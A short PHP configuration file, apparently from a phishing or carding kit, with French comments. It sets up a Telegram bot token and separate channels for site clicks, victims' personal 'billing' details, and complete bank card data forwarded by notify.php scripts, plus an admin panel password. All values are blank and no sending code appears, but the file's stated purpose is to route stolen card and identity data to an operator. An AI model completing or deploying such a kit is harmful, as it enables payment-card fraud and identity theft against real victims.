<?php

declare(strict_types=1);

return [
    // Token du bot Telegram (@BotFather)
    'bot_token' => '',

    // Canal 1 — clics sur le site
    'chat_id_clicks' => '',

    // Canal 2 — billing (informations personnelles, via partial-notify.php)
    'chat_id_billing' => '',

    // Canal 3 — CC (carte bancaire complète, via notify.php)
    'chat_id_cc' => '',

    // Optionnel — legacy, plus utilisé pour billing/cc
    'chat_id_rez' => '',

    // Mot de passe du panel admin
    'panel_password' => '',

    'enabled' => true,
];
